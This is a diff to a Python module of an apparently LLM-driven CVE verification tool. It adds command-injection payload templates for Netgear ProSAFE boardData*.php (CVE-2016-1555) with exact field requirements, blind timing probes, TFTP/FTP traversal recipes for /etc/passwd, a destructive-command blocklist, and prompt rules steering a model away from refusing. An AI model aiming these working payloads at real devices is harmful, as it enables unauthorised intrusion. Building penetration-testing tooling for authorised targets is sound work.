@@ -9,6 +9,7 @@ import json
 import os
 import re
 import secrets
+import shlex
 from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeout
 
 from ai.ollama import call_ollama_json, GENERATION_MODEL
@@ -32,6 +33,21 @@ LLM_CALL_TIMEOUT = float(os.getenv("LLM_CALL_TIMEOUT", "90"))
 #    可用環境變數 POC_ADAPT_TIMEOUT 調整（預設 180 秒）。
 POC_ADAPT_TIMEOUT = float(os.getenv("POC_ADAPT_TIMEOUT", "180"))
 _LLM_EXECUTOR = ThreadPoolExecutor(max_workers=4)
+
+# =============================================================================
+# 🛡️【破壞性指令黑名單（集中版）】
+# prompt 叫 7B 別用破壞性指令,但小模型偶爾不聽——這是程式層的最後保險。
+# 原本這條清單散在 _sanitize_cmd / generate_poc_cmds / adapt_poc_to_file 三處、
+# 且只擋 rm -rf / mkfs / fork bomb,漏掉 reboot/shutdown/dd/寫檔等。集中成一條並加寬:
+#   rm -rf、mkfs、fork bomb :(){、shutil.rmtree、
+#   reboot/halt/shutdown/poweroff/init 0、dd if=、kill/killall、寫入根目錄 > /
+# 任何函式要擋破壞性指令,一律用這條。
+# =============================================================================
+_DESTRUCTIVE_RE = re.compile(
+    r"\brm\s+-rf\b|\bmkfs\b|\b:\(\)\s*\{|\bshutil\.rmtree\b|"
+    r"\b(?:reboot|halt|shutdown|poweroff)\b|\binit\s+0\b|"
+    r"\bdd\s+if=|\bkillall\b|\bkill\s+-9\b|>\s*/(?:etc|bin|sbin|dev|boot)\b"
+)
 
 
 def _call_llm_json_guarded(guard_timeout: float = None, **kwargs):
@@ -65,12 +81,17 @@ def make_exec_nonce():
 
 # CWE → 類別；描述關鍵字為備援（RAG/NVD 不一定給 CWE）
 _CWE_CLASS = {
-    "78": "cmd_injection", "77": "cmd_injection",
+    "78": "cmd_injection", "77": "cmd_injection", "74": "cmd_injection",
     "22": "path_traversal", "23": "path_traversal", "36": "path_traversal",
     "89": "sqli",
     "79": "xss",
     "287": "auth_bypass", "306": "auth_bypass", "288": "auth_bypass",
     "200": "info_disclosure", "538": "info_disclosure", "548": "info_disclosure",
+    # —— report-only 類別（見 REPORT_ONLY_CLASSES）：分得出來,但 stage4_verify 只列報告不驗證 ——
+    "352": "csrf",
+    "16": "misconfiguration", "1188": "misconfiguration",
+    "119": "buffer_overflow", "120": "buffer_overflow", "121": "buffer_overflow",
+    "122": "buffer_overflow", "125": "buffer_overflow", "787": "buffer_overflow",
 }
 _DESC_CLASS_KEYWORDS = [
     ("cmd_injection",  ["command injection", "os command", "cmd injection", "remote code execution",
@@ -83,7 +104,17 @@ _DESC_CLASS_KEYWORDS = [
                          "missing authentication", "unauthenticated"]),
     ("info_disclosure",["information disclosure", "information exposure", "sensitive information",
                          "credential disclosure", "configuration disclosure"]),
+    # —— report-only 類別關鍵字（擺最後，讓上面可驗證的類別優先命中）——
+    ("csrf",           ["cross-site request forgery", "cross site request forgery", "csrf"]),
+    ("buffer_overflow",["buffer overflow", "stack-based buffer", "stack overflow",
+                         "heap overflow", "out-of-bounds write", "out of bounds write"]),
+    ("misconfiguration",["security misconfiguration", "improperly configured", "misconfiguration",
+                         "insecure default", "improper access control"]),
 ]
+
+# report-only 類別：能分類、但現有 _judge_success(nonce/root:x:0:0/uid=0…) 驗不出來。
+# stage4_verify 會比照 DoS 把這些只列報告、不進驗證迴圈（見 main.py）。
+REPORT_ONLY_CLASSES = {"csrf", "buffer_overflow", "misconfiguration"}
 
 
 def classify_cve(cve: dict) -> str:
@@ -108,11 +139,35 @@ def classify_cve(cve: dict) -> str:
 # cmd_injection 全部用 {NONCE} 當「執行回顯」錨點 → 只有真的執行才會回顯 marker。
 PAYLOAD_TEMPLATES = {
     "cmd_injection": [
-        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=;echo {NONCE};'",
-        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=|echo {NONCE}'",
-        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=`echo {NONCE}`'",
+        # —— ★Netgear ProSAFE boardData*.php 專用（CVE-2016-1555 家族，最優先）——
+        #    注入點是固定參數 macAddress，而且【必須】同時帶 reginfo=0 與 writeData=Submit
+        #    這兩個欄位，PHP 才會走到執行 system() 的程式路徑；少任一個 → 不執行 → 永遠打不中
+        #    （舊版只送單一 {PARAM}=;id，CVE-2016-1555 五次全滅就是因為少了這兩個欄位）。
+        #    值的格式：假 MAC + ; + 驗證指令 + ; + #（# 把後面原本串接的指令註解掉）。
+        #    {EP} 換成 RECON CONTEXT 裡的真實 boardData 端點（boardDataWW.php / boardDataNA.php…）。
+        #    ⚠️ 本漏洞是「盲注」：指令會執行但 stdout 不回顯到 HTTP 回應。echo/id 版只有在
+        #       少數會回顯的韌體看得到；通用解是下面的「時間差」模板（sleep + 量回應秒數）。
+        "curl -s '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;echo {NONCE};#' --data 'reginfo=0' --data 'writeData=Submit'",
+        "curl -s '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;id;#' --data 'reginfo=0' --data 'writeData=Submit'",
+        # —— ★盲注時間差驗證（boardData 家族；回應不回顯內容時用這條）——
+        #    -w 'OOB_SECONDS=%{time_total}' 讓 curl 把「整個請求的總耗時」印到 stdout。
+        #    靶機真的執行 sleep 7 → 回應約 7 秒 → OOB_SECONDS≈7；沒執行 → ≈0.x。
+        #    判定端看 OOB_SECONDS 是否 ≥ 門檻即可確認盲注 RCE（見 main.py 的時間差判定規則）。
+        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;sleep 7;#' --data 'reginfo=0' --data 'writeData=Submit'",
+        # —— 一般單參數 POST 變體（其他吃 POST form 的 sink）——
+        #    curl --data-urlencode 不帶 -G ＝ POST body(application/x-www-form-urlencoded)
+        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=;echo {NONCE};'",
+        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=|echo {NONCE}'",
+        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=`echo {NONCE}`'",
         "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=$(echo {NONCE})'",
+        # —— 一般單參數盲注時間差（非 boardData 的 sink 也可能是盲注）——
+        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 '{BASE}{EP}' --data-urlencode '{PARAM}=;sleep 7;#'",
+        # —— GET 變體（參數走 query string 的 *.cgi 類 sink）——
+        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=;echo {NONCE};'",
+        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=`echo {NONCE}`'",
         "curl -s '{BASE}{EP}?{PARAM}=%3Becho%20{NONCE}%3B'",
+        # —— GET 盲注時間差 ——
+        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 -G '{BASE}{EP}' --data-urlencode '{PARAM}=;sleep 7;#'",
     ],
     "path_traversal": [   # HTTP 路徑穿越（預設）
         "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=../../../../../../etc/passwd'",
@@ -167,12 +222,22 @@ _NONCE_CLASSES = {"cmd_injection", "xss"}
 # 讓它從 RECON CONTEXT 裡挑對位置，而不是硬套在登入表單。
 _SINK_HINTS = {
     "cmd_injection": {
-        "params": ["ip", "ipaddr", "ping_addr", "pingaddr", "host", "hostname", "addr", "target",
-                   "cmd", "command", "url", "action", "sysCmd"],
+        # macAddress 擺第一：Netgear boardData*.php 的注入點就是它，優先試。
+        "params": ["macAddress", "ip", "ipaddr", "ping_addr", "pingaddr", "host", "hostname",
+                   "addr", "target", "cmd", "command", "url", "action", "sysCmd"],
         "endpoint": (
             "目標：會把輸入拼進『系統指令』執行的端點。\n"
             "✓ 命中訊號：功能本身要對外互動——ping / traceroute / nslookup / DDNS 測試 / "
-            "韌體或網路診斷；路徑常見 *.cgi（ping.ccp、diagnostic.cgi、apply.cgi、hedwig.cgi）。\n"
+            "韌體或網路診斷；路徑常見 boardData*.php（boardDataWW.php / boardData102.php / "
+            "boardDataNA.php…，Netgear ProSAFE 系列,未授權表單直接進 CLI,走 POST）"
+            "或 *.cgi（ping.ccp、diagnostic.cgi、apply.cgi、hedwig.cgi，D-Link 系列）。\n"
+            "★【boardData*.php 鐵則】注入點固定是 macAddress 參數，且 POST body【必須】同時含 "
+            "reginfo=0 與 writeData=Submit 兩個欄位，少任一個 PHP 就不執行指令、必定打不中。"
+            "→ 直接照抄上面 boardData 模板（已內含這三個欄位），只把 {EP} 換成真實 boardData 端點，"
+            "千萬不要只送單一 cmd= 或 macAddress= 參數。\n"
+            "★【盲注提醒】這類漏洞多為『盲注』——指令會執行但輸出不回顯到 HTTP 回應（你只會收到"
+            "原本的表單頁，看不到 id/echo 的結果）。此時【務必】用含 OOB_SECONDS 的『時間差』模板"
+            "（注入 sleep 7、用 curl -w 量回應秒數）來驗證，不要因為沒看到回顯就判定失敗。\n"
             "✗ 跳過：純登入、純顯示、靜態頁。\n"
             "參數名只是線索：看到上列名稱優先試,但真正判準是『這個值最後會不會進 shell』。"
         ),
@@ -194,13 +259,14 @@ _SINK_HINTS = {
         "endpoint": (
             "目標：參數值會進 DB 查詢的端點。\n"
             "✓ 命中訊號：登入驗證 / 搜尋 / 清單 / 明細頁;改動參數會讓回傳筆數或內容改變。\n"
-            "✗ 跳過：回應完全不隨參數變化的靜態端點。"
+            "✗ 跳過：回應完全不隨參數變化的靜態端點。\n"
+            "註:嵌入式 AP 常把設定存 NVRAM/flat-file 而非 SQL,此類命中率偏低屬正常。"
         ),
     },
     "xss": {
         "params": ["q", "search", "keyword", "name", "msg", "message", "s", "query", "input"],
         "endpoint": (
-            "目標：會把輸入『原樣回顯到頁面』的端點。\n"
+            "目標：會把輸入『原樣回顯到頁面』的端點(反射型)。\n"
             "✓ 命中訊號：搜尋框結果頁 / 錯誤訊息頁 / 留言或表單回填;送進去的字串原封出現在 HTML。\n"
             "✗ 跳過：輸入只進後端不回顯的端點。"
         ),
@@ -223,6 +289,39 @@ _SINK_HINTS = {
         ),
     },
 
+    # —— 以下三類『現有 _judge_success(nonce/root:x:0:0/uid=0…) 驗不出來』——
+    #    已在 REPORT_ONLY_CLASSES 標記,stage4_verify 會比照 DoS 只列報告、不自動驗證。
+    #    下面 endpoint 描述寫的是「實際測得到的徵兆」,而非驗不出來的最終證明。
+    "csrf": {
+        "params": [],
+        "endpoint": (
+            "目標：缺乏不可預測 Token、可被跨站偽造請求來改設定/密碼的端點。\n"
+            "⚠️ 單機 curl 無法真正『證明』CSRF(需受害者已登入瀏覽器+跨站觸發);"
+            "自動化只能抓『徵兆』。\n"
+            "✓ 可偵測徵兆：會改系統設定/密碼的 POST 請求裡不含任何 anti-CSRF token,"
+            "或移除/偽造 Referer、Origin 後仍被接受並生效。\n"
+            "判準建議:歸『已識別、不自動驗證』,不強求 shell 回顯。"
+        ),
+    },
+    "buffer_overflow": {
+        "params": ["input", "buffer", "data", "len", "size"],
+        "endpoint": (
+            "目標：未對輸入/標頭長度做邊界檢查,導致堆疊/堆積緩衝區溢位的端點或常式。\n"
+            "⚠️ 與本專案『不打崩靶機』原則衝突,崩潰(segfault)在 HTTP 回應端也看不到;"
+            "此類多半已被 _is_dos_cve 當 DoS 略過。\n"
+            "判準建議:一律歸『已識別、不自動驗證』,不實際送超長 payload,以免靶機崩潰中斷後續測試。"
+        ),
+    },
+    "misconfiguration": {
+        "params": [],
+        "endpoint": (
+            "目標：安全設定配置不當(預設存取控制過寬、未啟用安全旗標、暴露不必要服務)。\n"
+            "⚠️ 範圍發散,難用成功關鍵字判定。\n"
+            "✓ 可偵測徵兆：敏感端點未授權即可達、敏感連接埠預設開啟、回應缺安全標頭。\n"
+            "判準建議:歸『已識別、不自動驗證』,佐以 recon/指紋證據寫報告。"
+        ),
+    },
+
     # —— 協定特化:路徑穿越不一定在 HTTP,可能在 TFTP/FTP ——
     "path_traversal:tftp": {
         "params": [],
@@ -230,9 +329,10 @@ _SINK_HINTS = {
             "此 CVE 的穿越在 **TFTP 服務(UDP/69)**,不是 HTTP,沒有 HTTP 端點/參數要填。\n"
             "前置:先確認 recon 顯示 udp/69 open(TFTP 無連線,掃描常報 open|filtered,"
             "可直接嘗試取檔驗證)。\n"
-            "做法:用 curl tftp://<target>/<穿越路徑> 或 tftp client GET,"
-            "逐步加深 ../ 讀系統檔(如 ../../../../etc/passwd)。\n"
-            "✓ 命中:回傳了目標檔內容。✗ 未命中:timeout(多半是 NAT/防火牆擋 UDP 回包,先排除網路再判定漏洞)"
+            "做法:TFTP 無認證、直接開路徑——先試『絕對路徑』(curl tftp://<target>/etc/passwd),"
+            "不中再試 ../ 逐步加深(../../../../etc/passwd)。\n"
+            "✓ 命中:回傳目標檔內容(讀到 /etc/passwd 會含 root:x:0:0,直接命中成功關鍵字)。\n"
+            "✗ 未命中:timeout(多半是 NAT/防火牆擋 UDP 回包,先排除網路再判定漏洞)"
             "或 'File not found'(路徑或深度不對,換 payload)。"
         ),
     },
@@ -240,9 +340,11 @@ _SINK_HINTS = {
         "params": [],
         "endpoint": (
             "此 CVE 的穿越在 **FTP 服務(TCP/21)**,無 HTTP 端點/參數。\n"
-            "前置:recon 確認 tcp/21 open。\n"
-            "做法:curl ftp://<target>/<穿越路徑>,或 FTP client 用 RETR/GET 取穿越路徑。\n"
-            "✓ 命中:取回目標檔。✗ 未命中:權限拒絕或路徑錯,調整 ../ 深度與起始目錄。"
+            "前置:recon 確認 tcp/21 open,並先確認『匿名登入(anonymous)或預設帳密』可用。\n"
+            "做法:curl ftp://<target>/<穿越路徑>(需要時帶 -u user:pass),"
+            "或 FTP client 用 RETR/GET 取穿越路徑;先試絕對路徑再試 ../ 加深。\n"
+            "✓ 命中:取回目標檔(讀到 /etc/passwd 含 root:x:0:0 即命中成功關鍵字)。\n"
+            "✗ 未命中:權限拒絕或路徑錯,調整 ../ 深度與起始目錄。"
         ),
     },
 }
@@ -337,7 +439,9 @@ STRICT RULES:
    CVE allows (e.g. a curl probe AND a python socket check), not the same command repeated.
 6. If the CVE cannot be meaningfully tested with a shell command, still output your best-effort
    probing commands (e.g. a banner grab with nc, or curl the service root) rather than refusing.
-7. No markdown, no commentary, JSON only.
+7. Do NOT append output filters like | grep / | head; return the raw command so the caller sees
+   the FULL response. Keep any quoting balanced.
+8. No markdown, no commentary, JSON only.
 """
 
 
@@ -355,18 +459,37 @@ def _fallback_cmds(cve: dict, target_ip: str, n: int) -> list:
 
 
 def _sanitize_cmd(c, target_ip: str):
-    """清洗單條指令：換掉 placeholder、擋外部網址與破壞性指令。
-    合格回傳清洗後字串；不合格回 None。"""
+    """清洗單條指令：換掉 placeholder、剝掉吃輸出的過濾管線、擋壞引號/外部網址/破壞性指令。
+    合格回傳清洗後字串；不合格回 None（呼叫端會改走保底探測）。"""
     if not isinstance(c, str) or not c.strip():
         return None
     c = c.strip()
     c = c.replace("example.com", target_ip).replace("TARGET_IP", target_ip)
     c = c.replace("<target>", target_ip).replace("{target}", target_ip)
+
+    # 🧹 剝掉會「吃掉/過濾輸出」的尾段管線(grep/head/awk/sed…)——判定要完整原始回應,
+    #    過濾交給 _judge_success。7B 常自己加 | grep PGT 把要判定的證據濾光(報告裡
+    #    CVE-2016-1555 五次全因此變「無文字輸出」)。只砍 filter 類,不動輸入側管線。
+    c = re.sub(
+        r"\s*\|\s*(?:grep|egrep|fgrep|head|tail|awk|cut|sed|wc|sort|uniq|tr|less|more)\b.*$",
+        "", c,
+    ).strip()
+    if not c:
+        return None
+
+    # 🧯 引號不平衡 → 送出去必爆(/bin/sh: Unterminated quoted string),丟棄走保底。
+    #    7B 常把模板的單引號改成雙引號又多塞一個引號,就是這種壞指令。用 shell 自己的
+    #    parser(shlex)判定,比數引號準,也不會誤殺 "it's" 這種合法內嵌引號。
+    try:
+        shlex.split(c)
+    except ValueError:
+        return None
+
     # 指令裡若出現 http(s) 但完全沒提到 target_ip，視為亂填，丟棄
     if ("http://" in c or "https://" in c) and target_ip not in c:
         return None
-    # 擋掉明顯破壞性指令
-    if re.search(r"\brm\s+-rf\b|\bmkfs\b|\b:\(\)\{", c):
+    # 擋掉明顯破壞性指令（集中黑名單）
+    if _DESTRUCTIVE_RE.search(c):
         return None
     return c
 
@@ -425,19 +548,12 @@ def generate_poc_cmds(cve: dict, target_ip: str, n: int = 5, context: str = "") 
                 if isinstance(c, str) and c.strip():
                     cmds.append(c.strip())
 
-    # 安全網：強制每條指令都指向 target_ip，過濾掉 7B 亂填的外部網址
+    # 安全網：強制每條指令都指向 target_ip、過濾外部網址與破壞性指令（共用 _sanitize_cmd）
     safe_cmds = []
     for c in cmds:
-        # 把常見 placeholder 換成真 target
-        c = c.replace("example.com", target_ip).replace("TARGET_IP", target_ip)
-        c = c.replace("<target>", target_ip).replace("{target}", target_ip)
-        # 指令裡若出現 http(s) 但完全沒提到 target_ip，視為亂填，丟棄
-        if ("http://" in c or "https://" in c) and target_ip not in c:
-            continue
-        # 擋掉明顯破壞性指令
-        if re.search(r"\brm\s+-rf\b|\bmkfs\b|\b:\(\)\{", c):
-            continue
-        safe_cmds.append(c)
+        cleaned = _sanitize_cmd(c, target_ip)
+        if cleaned:
+            safe_cmds.append(cleaned)
 
     if not safe_cmds:
         log_info.warn(f"⚠️ [Generation] {cve_id} 未產出有效指令，改用保底指令。")
@@ -563,8 +679,8 @@ def adapt_poc_to_file(cve: dict, target_ip: str, raw_poc: str, context: str = ""
         log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 產出不完整，略過。")
         return None
 
-    # 安全檢查：擋掉明顯破壞性內容
-    if re.search(r"\brm\s+-rf\b|\bmkfs\b|\b:\(\)\{|\bshutil\.rmtree\b", content):
+    # 安全檢查：擋掉明顯破壞性內容（集中黑名單）
+    if _DESTRUCTIVE_RE.search(content):
         log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 內容含破壞性指令，拒絕執行。")
         return None
 
@@ -608,6 +724,10 @@ def adapt_poc_to_file(cve: dict, target_ip: str, raw_poc: str, context: str = ""
                     run_cmd = (fixed.get("run_cmd") or run_cmd).strip()
                     language = (fixed.get("language") or language).lower().strip()
                     is_python = (language == "python") or filename.endswith(".py")
+                    # 修完的版本同樣過一次破壞性黑名單
+                    if _DESTRUCTIVE_RE.search(content):
+                        log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 修復後內容含破壞性指令，拒絕執行。")
+                        return None
             except FutureTimeout:
                 log_info.warn(f"⏱️ [PoC 改寫] {cve_id} 修復逾時，沿用原版嘗試。")
             except Exception as e:
@@ -667,7 +787,10 @@ STRICT RULES:
 5. If you have exhausted sensible options and nothing indicates vulnerability, set "done": true and
    return one harmless final probe, explaining in "reason" that no further test is meaningful.
 6. PREFER real endpoints from RECON CONTEXT over guessing generic paths like /status or /api.
-7. No markdown, no commentary. JSON only.
+7. When you use a PROVEN PAYLOAD TEMPLATE, copy its quoting EXACTLY (keep the single quotes as-is,
+   do not switch to double quotes or add stray quotes) and do NOT append output filters such as
+   | grep / | head / | awk — the caller needs the FULL raw response to judge success.
+8. No markdown, no commentary. JSON only.
 """
 
 # 單條「下一步指令」的 JSON schema（給原生 Ollama format= 用；LangChain 路徑走 JSON 解析）
